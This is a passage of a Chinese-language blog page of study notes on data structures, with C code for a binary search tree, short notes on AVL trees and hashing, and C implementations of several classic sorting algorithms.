class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;math.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> size 9</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">pLeft</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> *<span class="hljs-title">pRight</span>;</span><br>    <span class="hljs-type">int</span> value;<br>&#125; Node, *pNode;<br><br><span class="hljs-type">int</span> sub = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">int</span> nums[size] = &#123;<span class="hljs-number">0</span>&#125;;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">insertNode</span><span class="hljs-params">(pNode *pRoot, <span class="hljs-type">int</span> val)</span> &#123;<br>    <span class="hljs-keyword">if</span> (*pRoot == <span class="hljs-literal">NULL</span>) &#123;<br>        *pRoot = (pNode) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>        (*pRoot)-&gt;value = nums[sub];<br>        (*pRoot)-&gt;pLeft = <span class="hljs-literal">NULL</span>;<br>        (*pRoot)-&gt;pRight = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((*pRoot)-&gt;value &gt; nums[sub]) &#123;<br>        insertNode(&amp;(*pRoot)-&gt;pLeft, val);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((*pRoot)-&gt;value &lt; nums[sub]) &#123;<br>        insertNode(&amp;(*pRoot)-&gt;pRight, val);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        sub++;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">createTree</span><span class="hljs-params">(pNode *pRoot)</span> &#123;<br>    <span class="hljs-keyword">for</span> (; sub &lt; size; sub++) &#123;<br>        insertNode(pRoot, nums[sub]);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">destroyTree</span><span class="hljs-params">(pNode *pRoot)</span> &#123;<br>    <span class="hljs-keyword">if</span> ((*pRoot)-&gt;pLeft != <span class="hljs-literal">NULL</span>) &#123;<br>        destroyTree(&amp;(*pRoot)-&gt;pLeft);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;  %d  &quot;</span>, (*pRoot)-&gt;value);<br>    <span class="hljs-keyword">if</span> ((*pRoot)-&gt;pRight != <span class="hljs-literal">NULL</span>) &#123;<br>        destroyTree(&amp;(*pRoot)-&gt;pRight);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(*pRoot);<br>&#125;<br><br><span class="hljs-comment">//查找二叉树的元素</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">SearchBSF</span><span class="hljs-params">(pNode *root, pNode *value, <span class="hljs-type">int</span> val)</span> &#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * explain:查找二叉树</span><br><span class="hljs-comment">     * return:value,如果存在，就返回此节点的地址，否则返回上一个节点的地址</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-comment">//如果发现了值，就直接返回</span><br>    <span class="hljs-keyword">if</span> ((*root)-&gt;value &gt;= val) &#123;<br>        *value = *root;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((*root)-&gt;value == val) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((*root)-&gt;pLeft != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-type">int</span> i = SearchBSF(&amp;(*root)-&gt;pLeft, value, val);<br>        <span class="hljs-comment">//如果不写if,可能会出现后面还没有遍历，前面就已经退出</span><br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span> i;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((*root)-&gt;pRight != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-type">int</span> i = SearchBSF(&amp;(*root)-&gt;pRight, value, val);<br>        <span class="hljs-keyword">if</span> (i == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">return</span> i;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">//插入操作</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">InsertBST</span><span class="hljs-params">(pNode *root, <span class="hljs-type">int</span> val)</span> &#123;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * explain: 对二叉树排序树进行插入操作</span><br><span class="hljs-comment">     */</span><br>    pNode value = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> (!SearchBSF(root, &amp;value, val)) &#123;<br>        pNode tem = (pNode) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>        <span class="hljs-keyword">if</span>(tem==<span class="hljs-literal">NULL</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        tem-&gt;value = val;<br>        tem-&gt;pRight = <span class="hljs-literal">NULL</span>;<br>        tem-&gt;pLeft = <span class="hljs-literal">NULL</span>;<br><br>        <span class="hljs-keyword">if</span> (value-&gt;value &gt; val) &#123;<br>            tem-&gt;pLeft = value-&gt;pLeft;<br>            value-&gt;pLeft = tem;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value-&gt;value &lt; val) &#123;<br>            tem-&gt;pRight=value-&gt;pRight;<br>            value-&gt;pRight=tem;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;insert error&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">delete</span><span class="hljs-params">(pNode* p)</span>&#123;<br>    pNode q,s;<br>    <span class="hljs-keyword">if</span>((*p)-&gt;pRight==<span class="hljs-literal">NULL</span>)&#123;<br>        q=*p;<br>        (*p)=(*p)-&gt;pRight;<br>        <span class="hljs-built_in">free</span>(q);<br>        q=<span class="hljs-literal">NULL</span>;<br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((*p)-&gt;pLeft!=<span class="hljs-literal">NULL</span>)&#123;<br>        q=*p;<br>        (*p)=(*p)-&gt;pLeft;<br>        <span class="hljs-built_in">free</span>(q);<br>        q=<span class="hljs-literal">NULL</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        q=*p;<br>        s=q-&gt;pRight;<br>        <span class="hljs-keyword">while</span>(s!=<span class="hljs-literal">NULL</span>)&#123;<br>            q=s;<br>            s=s-&gt;pRight;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(q==*p)&#123;<br>            q=s;<br>            s=s-&gt;pLeft;<br>            (*p)-&gt;value=q-&gt;value;<br>            <span class="hljs-built_in">free</span>(q);<br>            q=<span class="hljs-literal">NULL</span>;<br>            (*p)-&gt;pLeft=s;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            (*p)-&gt;value=s-&gt;value;<br>            q-&gt;pRight=s-&gt;pLeft;<br>            <span class="hljs-built_in">free</span>(s);<br>            s=<span class="hljs-literal">NULL</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><br><span class="hljs-comment">//删除节点</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">deleteBST</span><span class="hljs-params">(pNode* root,<span class="hljs-type">int</span> val)</span>&#123;<br>    pNode tem;<br>    <span class="hljs-keyword">if</span>(*root==<span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;don&#x27;t have tree&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span>(SearchBSF(root,&amp;tem,val))&#123;<br>            <span class="hljs-keyword">return</span> delete(&amp;tem);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    pNode root = <span class="hljs-literal">NULL</span>;<br>    pNode valueTem = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">int</span> value;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; ++i) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;nums[i]);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input value: &quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;value);<br>    createTree(&amp;root);<br>    <span class="hljs-keyword">if</span> (SearchBSF(&amp;root, &amp;valueTem, value)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hava value %d\n&quot;</span>, value);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;don&#x27;t hava value\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;value node is:%d\n&quot;</span>, valueTem-&gt;value);<br>    InsertBST(&amp;root,value);<br>    <span class="hljs-keyword">if</span> (SearchBSF(&amp;root, &amp;valueTem, value)) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hava value %d\n&quot;</span>, value);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;don&#x27;t hava value\n&quot;</span>);<br>    &#125;<br>    deleteBST(&amp;root,value);<br>    destroyTree(&amp;root);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="平衡二叉排序树-AVL树"><a href="#平衡二叉排序树-AVL树" class="headerlink" title="平衡二叉排序树(AVL树)"></a>平衡二叉排序树(AVL树)</h2><ol><li><p>定义</p><p>左右子树的高度之差的绝对值小于等于1 </p><p>左右子树是一个平衡二叉排序树    </p></li><li><p>平衡因子</p><p>左右子树的高度差(左子树-右子树)</p><p><code>-1</code>,<code>1</code>,<code>0</code></p></li><li><p>调整平衡二叉树</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/%E8%B0%83%E6%95%B4%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91.jpg"></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/LL%E5%9E%8B.png"></p></li></ol><h2 id="散列表（hash）"><a href="#散列表（hash）" class="headerlink" title="散列表（hash）"></a>散列表（hash）</h2><ol><li><p>定义</p><p>记录储存位置，与关键字的之间的对应关系</p></li><li><p>散列方法</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/%E6%95%A3%E5%88%97%E6%96%B9%E6%B3%95.png"></p></li><li><p>冲突</p><p>不同的关键码通过散列方法映射到同一个位置  </p></li><li><p>同义词</p><p>具有相同地址的关键字</p></li><li><p>构造散列函数</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B0%E7%9A%84%E6%9E%84%E9%80%A0.png"></p></li><li><p>处理冲突</p><ul><li><p>开放地址法</p><p> <img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/%E5%BC%80%E6%94%BE%E5%9C%B0%E5%9D%80fa.png"></p></li><li><p>链地址法</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/%E9%93%BE%E5%9C%B0%E5%9D%80%E6%B3%95.png"></p></li></ul></li><li><p>散列表的查找</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/algorithm/%E6%95%A3%E5%88%97%E8%A1%A8%E7%9A%84%E6%9F%A5%E6%89%BE%E6%96%B9%E6%B3%95.png"></p></li></ol><h1 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h1><h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><ol><li><p>普通版</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[],<span class="hljs-type">int</span> size)</span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt; size-i; ++j) &#123;<br>            <span class="hljs-keyword">if</span>(ints[j<span class="hljs-number">-1</span>]&lt;ints[j])&#123;<br>                <span class="hljs-type">int</span> tem=ints[j<span class="hljs-number">-1</span>];<br>                ints[j<span class="hljs-number">-1</span>]=ints[j];<br>                ints[j]=tem;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>根据需要限定范围</p></li></ol><h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[],<span class="hljs-type">int</span> size)</span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i+<span class="hljs-number">1</span>; j &lt; size; ++j) &#123;<br>            <span class="hljs-keyword">if</span>(ints[i]&gt;ints[j])&#123;<br>                <span class="hljs-type">int</span> tem=ints[i];<br>                ints[i]=ints[j];<br>                ints[j]=tem;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="直接插入排序"><a href="#直接插入排序" class="headerlink" title="直接插入排序"></a>直接插入排序</h2><ol><li><p>对一个有序表插入一个数据</p></li><li><p>对一个无序的线表排序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">   <br><span class="hljs-type">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[], <span class="hljs-type">int</span> size)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; size; ++i) &#123;<br>        <span class="hljs-keyword">if</span> (ints[i] &lt; ints[i - <span class="hljs-number">1</span>]) &#123;<br>            <span class="hljs-type">int</span> tem=ints[i];<br>            <span class="hljs-type">int</span> j=i<span class="hljs-number">-1</span>;<br>            <span class="hljs-keyword">for</span> (; ints[j] &gt; tem; --j) &#123;<br>                ints[j+<span class="hljs-number">1</span>]=ints[j];<br>            &#125;<br>            ints[j+<span class="hljs-number">1</span>]=tem;<br>        &#125;<br>    &#125;<br>&#125;<br>   <br>   <br></code></pre></td></tr></table></figure></li></ol><h2 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h2><ol><li><p>只是对插排分组</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">   <br><span class="hljs-type">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[], <span class="hljs-type">int</span> size)</span> &#123;<br>    <span class="hljs-type">int</span> range=size;<br>    <span class="hljs-keyword">while</span>((range=range/<span class="hljs-number">3</span>)&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = range; i &lt; size; ++i) &#123;<br>            <span class="hljs-keyword">if</span> (ints[i] &lt; ints[i - range]) &#123;<br>                <span class="hljs-type">int</span> tem=ints[i];<br>                <span class="hljs-type">int</span> j=i-range;<br>                <span class="hljs-keyword">for</span> (; ints[j] &gt; tem; j-=range) &#123;<br>                    ints[j+range]=ints[j];<br>                &#125;<br>                ints[j+range]=tem;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>   <br></code></pre></td></tr></table></figure></li></ol><h2 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h2><ol><li><p>大根堆</p><p>根节点大于等于左右孩子的<code>value</code></p></li><li><p>小根堆</p><p>根节点小于等于左右孩子的<code>value</code></p></li><li><p>代码实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c">   <br><span class="hljs-type">void</span> <span class="hljs-title function_">HeapAdjust</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[], <span class="hljs-type">int</span> s, <span class="hljs-type">int</span> size)</span> &#123;<br>    <span class="hljs-type">int</span> tem = ints[s];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = s * <span class="hljs-number">2</span>; i &lt;= size; i *= <span class="hljs-number">2</span>) &#123;<br>        <span class="hljs-keyword">if</span> (i &lt; size &amp;&amp; ints[i] &lt; ints[i + <span class="hljs-number">1</span>]) &#123;<br>            i++;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (tem &gt;= ints[i]) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        ints[s] = ints[i];<br>        s = i;<br>    &#125;<br>    ints[s] = tem;<br>&#125;<br>   <br><span class="hljs-type">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[], <span class="hljs-type">int</span> size)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = size / <span class="hljs-number">2</span>; i &gt; <span class="hljs-number">0</span>; --i) &#123;<br>        HeapAdjust(ints, i, size);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = size; i &gt; <span class="hljs-number">0</span>; --i) &#123;<br>        <span class="hljs-type">int</span> tem = ints[<span class="hljs-number">1</span>];<br>        ints[<span class="hljs-number">1</span>] = ints[i];<br>        ints[i] = tem;<br>        HeapAdjust(ints, <span class="hljs-number">1</span>, i - <span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br>   <br></code></pre></td></tr></table></figure></li></ol><h2 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2><ol><li><p>有序表的合并</p><p>(线性表的合并)[<a href="https://tsy244.github.io/2023/03/27/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%BA%BF%E6%80%A7%E8%A1%A8/#%E7%BA%BF%E6%80%A7%E8%A1%A8%E7%9A%84%E5%BA%94%E7%94%A8">线性表 - chg (tsy244.github.io)</a>]</p></li><li><p>递归 代码实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">merge</span><span class="hljs-params">(<span class="hljs-type">int</span> *list1, <span class="hljs-type">int</span> list1_size, <span class="hljs-type">int</span> *list2, <span class="hljs-type">int</span> list2_size)</span> &#123;<br>    <span class="hljs-type">int</span> ints[<span class="hljs-number">20</span>] = &#123;<span class="hljs-number">-1</span>&#125;;<br>    <span class="hljs-type">int</span> list1Sub = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> list2Sub = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> intsSub = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (list1_size != list1Sub &amp;&amp; list2_size != list2Sub) &#123;<br>        ints[intsSub++] = list1[list1Sub] &gt; list2[list2Sub] ? list1[list1Sub++] : list2[list2Sub++];<br>    &#125;<br>    <span class="hljs-keyword">while</span> (list2Sub &lt; list2_size) &#123;<br>        ints[intsSub++] = list2[list2Sub++];<br>    &#125;<br>    <span class="hljs-keyword">while</span> (list1Sub &lt; list1_size) &#123;<br>        ints[intsSub++] = list1[list1Sub++];<br>    &#125;<br>   <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; list1_size+list2_size; ++i) &#123;<br>        list1[i]=ints[i];<br>    &#125;<br>&#125;<br>   <br>   <br><span class="hljs-type">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[], <span class="hljs-type">int</span> size)</span> &#123;<br>    <span class="hljs-keyword">if</span> (size &gt; <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-type">int</span> *list1 = ints;<br>        <span class="hljs-type">int</span> list1_size = size / <span class="hljs-number">2</span>;<br>        <span class="hljs-type">int</span> *list2 = ints + list1_size;<br>        <span class="hljs-type">int</span> list2_size = size - list1_size;<br>   <br>        sort(list1, list1_size);<br>        sort(list2, list2_size);<br>        merge(list1, list1_size, list2, list2_size);<br>   <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>迭代代码实现</p></li></ol><h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><ol><li>普通实现的快速排序</li></ol>   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">findMidSub</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[],<span class="hljs-type">int</span> low,<span class="hljs-type">int</span> high)</span>&#123;<br>    ints[<span class="hljs-number">0</span>]=ints[low];<br>    <span class="hljs-keyword">while</span>(low&lt;high)&#123;<br>        <span class="hljs-keyword">while</span>(low&lt;high&amp;&amp;ints[high]&gt;ints[<span class="hljs-number">0</span>])&#123;<br>            high--;<br>        &#125;<br>        ints[low]=ints[high];<br>        <span class="hljs-keyword">while</span>(low&lt;high&amp;&amp;ints[low]&lt;ints[<span class="hljs-number">0</span>])&#123;<br>            low++;<br>        &#125;<br>        ints[high]=ints[low];<br>    &#125;<br>    ints[low]=ints[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">return</span> low;<br>&#125;<br>   <br>   <br><span class="hljs-type">void</span> <span class="hljs-title function_">sort</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[], <span class="hljs-type">int</span> low,<span class="hljs-type">int</span> high)</span> &#123;<br>    <span class="hljs-keyword">if</span>(low&lt;high)&#123;<br>        <span class="hljs-type">int</span> midSub=findMidSub(ints,low,high);<br>   <br>        sort(ints,low,midSub<span class="hljs-number">-1</span>);<br>        sort(ints,midSub+<span class="hljs-number">1</span>,high);<br>    &#125;<br>&#125;<br>   <br></code></pre></td></tr></table></figure><ol start="2"><li><p>改良的快排</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">findMidSub</span><span class="hljs-params">(<span class="hljs-type">int</span> ints[],<span class="hljs-type">int</span> low,<span class="hljs-type">int</span> high)</span>&#123;<br>    <span class="hljs-type">int</span> mid=low+(high-low)/<span class="hljs-number">2</span>;<br>    <span 